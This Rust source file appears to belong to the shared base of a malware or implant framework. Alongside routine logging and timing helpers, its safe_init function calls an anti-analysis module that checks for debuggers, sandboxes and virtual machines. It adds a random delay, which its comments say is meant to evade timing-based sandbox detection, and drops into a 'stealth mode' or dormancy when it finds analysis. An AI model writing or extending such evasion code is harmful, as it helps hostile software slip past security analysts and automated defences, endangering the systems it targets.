pub fn init_logging(agent_name: &str) {
    tracing_subscriber::fmt()
        .with_target(false)
        .with_env_filter(
            tracing_subscriber::EnvFilter::from_default_env()
                .add_directive(format!("{}=debug", agent_name).parse().unwrap())
                .add_directive("agent_base=info".parse().unwrap()),
        )
        .init();
}

/// Initialize agent with anti-analysis checks.
/// Returns false if the environment appears dangerous (debugger, sandbox, VM).
/// If unsafe, the agent can choose to lie dormant or use conservative behavior.
pub fn safe_init(agent_name: &str) -> bool {
    init_logging(agent_name);

    // Random delay to evade timing-based sandbox detection
    let delay = random_delay(1, 10);
    std::thread::sleep(std::time::Duration::from_secs(delay));

    // Run anti-analysis
    let safe = crate::anti_analysis::AntiAnalysis::is_safe();
    if !safe {
        tracing::warn!("{}: unsafe environment detected, operating in stealth mode", agent_name);
    } else {
        tracing::info!("{}: environment appears safe", agent_name);
    }

    safe
}

pub fn timestamp_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

pub fn random_delay(min_secs: u64, max_secs: u64) -> u64 {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    rng.gen_range(min_secs..=max_secs)
}

